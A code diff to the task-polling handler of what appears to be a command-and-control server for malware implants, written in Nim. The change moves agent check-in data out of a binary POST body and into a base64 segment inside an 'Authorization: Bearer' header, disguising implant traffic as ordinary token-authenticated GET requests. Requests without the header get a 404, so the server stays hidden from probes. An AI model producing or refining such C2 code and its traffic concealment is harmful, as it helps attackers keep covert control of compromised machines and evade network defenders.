@@ -31,20 +31,22 @@ proc register*(ctx: Context) {.async.} =
         resp "", Http404
 
 #[
-    POST /tasks
+    GET /tasks
     Called from agent to check for new tasks
 ]#
 proc getTasks*(ctx: Context) {.async.} = 
 
     # Check headers
-    # If POST data is not binary data, return 404 error code
-    if ctx.request.contentType != "application/octet-stream": 
-        resp "", Http404
-        return  
+    # Heartbeat data is hidden base64-encoded within "Authorization: Bearer" header, between a prefix and suffix 
+    if not ctx.request.hasHeader("Authorization"): 
+        resp "", Http404 
+        return 
+
+    let checkinData: seq[byte] = decode(ctx.request.getHeader("Authorization")[0].split(".")[1]).toBytes()
 
     try: 
         var response: seq[byte]
-        let tasks: seq[seq[byte]] = getTasks(ctx.request.body.toBytes())
+        let tasks: seq[seq[byte]] = getTasks(checkinData)
 
         if tasks.len <= 0: 
             resp "", Http200
